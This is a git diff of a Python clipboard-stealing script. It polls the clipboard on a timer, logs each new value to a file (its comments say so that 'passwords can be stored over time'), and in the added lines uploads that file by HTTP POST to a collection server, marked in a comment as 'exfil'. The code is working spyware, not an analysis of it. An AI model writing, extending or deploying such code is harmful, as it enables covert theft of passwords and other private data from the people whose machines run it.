@@ -1,5 +1,5 @@
-import os
 import pyperclip
+import requests
 import schedule
 import time
 from pynput import keyboard
@@ -31,7 +31,6 @@ import keyboard
 
 #copied = False - how to add boolean to the hotkey calls
 def main():
-
 
     #gets the clipboard information and puts it in a file every 10 seconds.
     schedule.every(90).seconds.do(get_clipboard_info)
@@ -70,15 +69,39 @@ def get_clipboard_info():
     clipboard_info = pyperclip.paste()
 
     # a appends data to file so the passwords can be stored over time password
+    #plus means for reading and writing, need to be able to read it to pass it through
     clipboard_data_file = open("myfile.txt", "a")
 
     if not last_clip_board_value == clipboard_info:
         # time.strftime('%a', time.localtime()) - https://docs.python.org/3.12/library/time.html - could be used to format the string by hand
         clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
         clipboard_data_file.write("\n")
+        #exfil here...
 
+        #cloes file!!! FILE mUST BE closed so it resets first
+        clipboard_data_file.close()
 
-    clipboard_data_file.close()
+        #reopens the file
+        exfil_file = clipboard_data_file = open("myfile.txt", "r")
+
+        # for line in exfil_file:
+        #     print(line)
+
+        #TODO: could communicate them one at a time and write them to a file or need to communicate a file
+        #json={"data": clipboard_info}, - to communicate one by one
+
+        #THIS CAN BE USED - IT COMMUNICATES THE DATA TO THE OTHER SERVER
+        # data = clipboard_data_file.read(-1)
+        # print("ll" + data)
+        # requests.post("http://127.0.0.1:12345/output", data=data)
+
+        #communicates using a file and reads file input on the server instead of the client
+        #ISSUE THAT HAS BEEN OCCURING WAS THE FILE NEEDED TO BE CLOSED AFTER BEING WRITTEN IN OTHERWISE THE CONTENT
+        #WAS BLANKS
+        requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})
+
+    else:
+        clipboard_data_file.close()
 
     last_clip_board_value = clipboard_info
 
